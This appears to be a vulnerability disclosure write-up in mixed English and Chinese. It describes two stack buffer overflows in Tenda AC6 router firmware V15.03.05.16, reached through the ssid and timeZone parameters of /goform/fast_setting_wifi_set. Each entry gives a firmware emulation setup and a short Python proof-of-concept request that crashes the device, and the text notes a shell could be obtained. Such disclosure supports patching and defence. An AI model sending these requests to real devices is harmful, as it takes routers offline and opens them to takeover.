form\_fast\_setting\_wifi\_ set ssid
------------------------------------

### Overview

*   设备官网：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   固件下载网站： [AC6V1.0升级软件](https://www.tenda.com.cn/material/show/102661)

![](api/attachments/OLpMhoNjD8Vg/image/image.png)

### Affected version

**V15.03.05.16**

### Environmental simulation

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥
```

### Vulnerability details

The acting parameter ssid of the function form\_fast\_setting\_wifi\_set in the affected file /goform/fast\_setting\_wifi\_set causes a stack-based buffer overflow. The attack can be launched remotely

In the function form\_fast\_setting\_wifi\_set, it reads the user-supplied arguments into src and `strcpys`

![](api/attachments/OzhOMXwsr5cB/image/image.png)

### poc

```text-plain
import requests

IP = "192.168.142.100"
url = f"http://{IP}/goform/fast_setting_wifi_set?"
url += "ssid=" + "s" * 100

response = requests.get(url)
```

![](api/attachments/XJRH28oqmYZp/image/image.png)

form\_fast\_setting\_wifi\_set  timeZone
----------------------------------------

### Overview

*   设备官网：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   固件下载网站： [AC6V1.0升级软件](https://www.tenda.com.cn/material/show/102661)

![](api/attachments/OLpMhoNjD8Vg/image/image.png)

### Affected version

**V15.03.05.16**

### Environmental simulation

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥
```

### Vulnerability details

  
This function accepts the POST parameter timeZone, does not verify its length, and copies it directly to a local variable on the stack, resulting in a stack overflow. This vulnerability allows an attacker to cause a denial of service (DoS), but of course you can build a payload to get a stable shell to control the device.

![](api/attachments/MUgRNGsrj29y/image/image.png)

A vulnerability was found in Tenda AC6 V15.03.05.16. The vulnerability affects the functionality of the /goform/fast\_setting\_wifi\_set file form\_fast\_setting\_wifi\_set. Using the timeZone parameter causes a stack-based buffer overflow. The attack can be launched remotely.

### poc

```text-plain
import requests

# URL
url = "http://192.168.142.100/goform/fast_setting_wifi_set"


# POST
data = {
    "ssid": b"Raining",
    "timeZone": b'Raining'*0x100
}


response = requests.post(url,data=data)

print("Status Code:", response.status_code)
print("Response Body:", response.text)
```

![](api/attachments/OHRp2yJGNXI6/image/image.png)